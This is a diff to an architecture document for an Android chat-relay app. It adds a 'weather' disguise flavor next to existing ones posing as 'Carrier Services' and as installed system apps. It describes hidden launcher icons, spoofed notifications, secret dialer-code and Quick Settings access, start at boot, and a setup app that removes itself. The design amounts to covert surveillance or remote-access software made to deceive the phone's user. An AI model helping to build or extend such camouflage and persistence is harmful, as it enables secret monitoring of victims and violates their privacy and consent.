@@ -45,11 +45,13 @@ graph TD
         O["original<br/>Standard launcher icon"]
         CP["captivePortal<br/>Disguised as Carrier Services"]
         DE["decoyEngine<br/>Dynamic app camouflage"]
+        WE["weather<br/>Disguised as Weather App"]
     end
 
     APP --> O
     APP --> CP
     APP --> DE
+    APP --> WE
     SETUP -->|"RSA-2048 encrypted handover"| APP
     SETUP -->|"Main app requests uninstallation"| X["🗑️ Uninstalled"]
 ```
@@ -62,8 +64,9 @@ graph TD
 | Flavor | Identity | Stealth Level |
 |--------|----------|---------------|
 | `original` | Standard app with launcher icon | None (dev/debug) |
-| `captivePortal` | Disguised as "Carrier Services" | Hidden icon, camouflaged notifications, QS tile access |
+| `captivePortal` | Disguised as "Carrier Services" | See [CaptivePortal.md](flavors/CaptivePortal.md) for details. |
 | `decoyEngine` | Impersonates installed system apps | Dynamic notification spoofing, DecoyActivity tap targets |
+| `weather` | Disguised as "Weather" App | See [FlavorWeather.md](flavors/FlavorWeather.md) for details. |
 
 ---
 
@@ -72,7 +75,7 @@ graph TD
 ```mermaid
 graph TB
     subgraph "UI Layer (Jetpack Compose)"
-        NAV[AppNav] --> CS[ChatScreen]
+        NAV[AppNav & StatusFlowOverlay] --> CS[ChatScreen]
         NAV --> PS[ProfileScreen]
         NAV --> SS[SettingsScreen]
         NAV --> LS[LogsScreen]
@@ -129,7 +132,7 @@ app/src/main/java/com/mobile/superiorchat/
 │   ├── KeyProvider.kt              # ContentProvider exposing RSA public key for setup IPC
 │   ├── NetState.kt                 # Connectivity monitoring via StateFlow
 │   ├── ServiceCore.kt              # Foreground service lifecycle & WorkManager fallback
-│   └── StatusFlow.kt               # Global sync state management
+│   └── StatusFlow.kt               # Global sync & active media transfer state management
 │
 ├── data/                           # Persistence
 │   ├── Prefs.kt                    # EncryptedSharedPreferences (AES-256-GCM)
@@ -150,7 +153,7 @@ app/src/main/java/com/mobile/superiorchat/
 ├── media/                          # Media handling
 │   ├── AudioPlayer.kt              # Voice note playback
 │   ├── AudioRecorder.kt            # Voice note recording (M4A/AMR)
-│   ├── LocalDirs.kt                # Media directory management (sent/received)
+│   ├── LocalDirs.kt                # Dynamic media directory management (flavor aware)
 │   ├── MediaSync.kt                # Concurrent-safe transfers + WorkManager
 │   └── MediaWorker.kt              # WorkManager CoroutineWorker
 │
@@ -168,35 +171,44 @@ app/src/main/java/com/mobile/superiorchat/
 │   ├── LogsScreen.kt               # Diagnostic logs viewer
 │   ├── MainViewModel.kt            # Global app state
 │   ├── PermissionsScreen.kt        # Runtime permission handler
-│   ├── ProfileScreen.kt            # Target chat profile display
-│   ├── ProfileViewModel.kt         # Profile editing & photo state
 │   ├── SettingsScreen.kt           # Credential config & toggles
+│   ├── profile/                    # Profile feature package
+│   │   ├── ProfileScreen.kt        # Bot's own profile display (separated from receiver's profile)
+│   │   └── ProfileViewModel.kt     # Profile editing & photo state
 │   └── components/                 # Reusable UI components
-│       ├── profile/
-│       │   ├── EditInfoSheet.kt     # Modal sheet for editing profile details
-│       │   └── ProfileSettings.kt   # Danger zone & profile settings
-│       ├── AttachMenu.kt            # Attachment bottom sheet
-│       ├── AudioBubble.kt           # Waveform visualization & playback
-│       ├── ChatInputBox.kt          # Text input with recording & attachments
-│       ├── FileExplorer.kt          # Hierarchical file browser
-│       ├── GalleryGrid.kt           # Media grid with album filtering
-│       ├── ImageCropper.kt          # Photo cropping utility
-│       ├── MediaPicker.kt           # Media selection orchestrator
-│       ├── MediaViewer.kt           # Full-screen media viewer
-│       ├── MessageBubble.kt         # Message rendering (text/media)
-│       ├── Popups.kt                # Reusable dialogs (ActionDialog, etc.)
-│       ├── ProfileCard.kt           # Reusable profile header card
-│       ├── QrScanner.kt             # QR code scanner
-│       ├── ScrollEvent.kt           # Scroll state utility
-│       └── UIModifiers.kt           # Custom modifiers (glow, bounce, etc.)
+│       ├── AttachMenu.kt           # Attachment bottom sheet
+│       ├── ChatInputBox.kt         # Text input with recording & attachments
+│       ├── QrScanner.kt            # QR code scanner
+│       ├── ScrollEvent.kt          # Scroll state utility
+│       ├── UIModifiers.kt          # Custom modifiers (glow, bounce, etc.)
+│       ├── bubbles/                # Message rendering components
+│       │   ├── AudioBubble.kt      # Waveform visualization & playback
+│       │   ├── DocumentBubble.kt   # Document attachment rendering
+│       │   ├── MediaBubble.kt      # Photo/Video visualization
+│       │   └── MessageBubble.kt    # Standard text wrapper & orchestration
+│       ├── media/                  # Media handling UI
+│       │   ├── FileExplorer.kt     # Hierarchical file browser
+│       │   ├── GalleryGrid.kt      # Media grid with album filtering
+│       │   ├── ImageCropper.kt     # Photo cropping utility
+│       │   ├── MediaPicker.kt      # Media selection orchestrator
+│       │   └── MediaViewer.kt      # Full-screen media viewer
+│       ├── popups/                 # Modals and Dialogs
+│       │   ├── MessagePopups.kt    # Message interactions (Context menu, emojis)
+│       │   ├── StatusPill.kt       # Future-proof global sync & transfer state pill
+│       │   └── SystemPopups.kt     # Global app dialogs (Warnings, credentials)
+│       └── profile/                # Profile UI fragments
+│           ├── EditInfoSheet.kt    # Modal sheet for editing profile details
+│           ├── PartnerProfile.kt   # Reusable profile header card
+│           └── ProfileSettings.kt  # Danger zone & profile settings
 │
 └── utils/                          # Cross-cutting utilities
-    ├── AppLog.kt                    # Thread-safe diagnostic logger
-    ├── BootReceiver.kt              # Starts service on device boot
-    ├── FileUtils.kt                 # File type resolution & IO
-    ├── QrManager.kt                 # QR code generation & AES decryption
-    ├── Security.kt                  # RSA/AES encryption (Keystore-backed)
-    └── Validator.kt                 # Regex patterns for bot token/chat ID
+    ├── AppLog.kt                   # Thread-safe diagnostic logger
+    ├── BootReceiver.kt             # Starts service on device boot
+    ├── FileUtils.kt                # File type resolution & IO
+    ├── Permissions.kt              # Universal permission state & rationale handler
+    ├── QrManager.kt                # QR code generation & AES decryption
+    ├── Security.kt                 # RSA/AES encryption (Keystore-backed)
+    └── Validator.kt                # Regex patterns for bot token/chat ID
 ```
 
 ### 4.2 Flavor Source Sets
@@ -214,6 +226,11 @@ app/src/
 │   ├── java/.../bot/
 │   │   └── Notifier.kt             # Carrier-specific camouflaged notifications
 │   └── res/                        # Disguised icons, camo_strings
+│
+├── weather/                        # Weather App camouflage
+│   ├── AndroidManifest.xml         # taskAffinity isolation, Intent interception
+│   ├── java/.../                   # Authentic Weather UI logic, Retrofit integrations
+│   └── res/                        # Authentic adaptive icons, dynamic live camo_strings
 │
 └── decoyEngine/                    # Shared camouflage library
     ├── AndroidManifest.xml
@@ -286,9 +303,10 @@ The app has **no launcher icon** in stealth flavors. Access methods:
 | Method | Flavor | How |
 |--------|--------|-----|
 | **Dialer Code** | All (via decoyEngine) | Dial `*#*#9131#*#*` → `CodeReceiver` intercepts → launches `MainActivity` |
-| **QS Tile** | captivePortal | ON, OFF, ON and HOLD Quick Settings tile → `TileActivity` → `MainActivity` |
+| **QS Tile** | captivePortal | See [CaptivePortal.md](flavors/CaptivePortal.md) for access sequence |
+| **App Search** | weather | See [FlavorWeather.md](flavors/FlavorWeather.md) for interception details |
 | **Boot** | All | `BootReceiver` starts `BotService` on `BOOT_COMPLETED` |
-| **Launcher** | original only | Standard app drawer icon (debug/dev use) |
+| **Launcher** | original, weather | Standard app drawer icon (debug/dev or weather disguise) |
 
 ---
 
